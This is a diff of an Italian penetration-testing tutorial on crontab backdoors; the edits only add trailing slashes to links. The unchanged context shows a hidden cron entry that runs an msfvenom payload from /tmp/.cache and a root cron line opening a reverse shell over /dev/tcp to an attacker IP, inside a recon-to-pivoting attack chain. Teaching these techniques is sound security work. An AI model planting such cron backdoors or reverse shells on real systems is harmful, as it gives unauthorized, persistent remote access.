@@ -253,7 +253,7 @@ La crontab backdoor si inserisce naturalmente dopo l'accesso iniziale e prima de
 
 **Flusso tipico:**
 
-Nmap (recon) → Exploit web/SSH → **Crontab Backdoor (persistence)** → [SSHuttle](https://hackita.it/articoli/sshuttle) (pivoting)
+Nmap (recon) → Exploit web/SSH → **Crontab Backdoor (persistence)** → [SSHuttle](https://hackita.it/articoli/sshuttle/) (pivoting)
 
 Il payload del cron job può essere generato con msfvenom e ricevuto con il multi/handler di Metasploit:
 
@@ -263,7 +263,7 @@ chmod +x /tmp/.cache
 (crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.cache") | crontab -
 ```
 
-Se stai operando con [ProxyChains](https://hackita.it/articoli/proxychains) per raggiungere segmenti interni, il cron job garantisce che la sessione sulla macchina compromessa sopravviva a disconnessioni della catena proxy.
+Se stai operando con [ProxyChains](https://hackita.it/articoli/proxychains/) per raggiungere segmenti interni, il cron job garantisce che la sessione sulla macchina compromessa sopravviva a disconnessioni della catena proxy.
 
 | Scenario              | Crontab Backdoor    | Systemd Service | RC.local |
 | --------------------- | ------------------- | --------------- | -------- |
@@ -309,7 +309,7 @@ echo '*/15 * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.14.22/5555 0>&1"
 
 **Fase 5 — Pivoting (15 min)**
 
-Usa [SSHuttle](https://hackita.it/articoli/sshuttle) dal tuo attacker box per raggiungere la subnet interna 172.16.0.0/24 attraverso la macchina compromessa. Il cron job mantiene l'accesso anche se SSHuttle cade.
+Usa [SSHuttle](https://hackita.it/articoli/sshuttle/) dal tuo attacker box per raggiungere la subnet interna 172.16.0.0/24 attraverso la macchina compromessa. Il cron job mantiene l'accesso anche se SSHuttle cade.
 
 **Timeline totale stimata:** \~80 minuti.
 
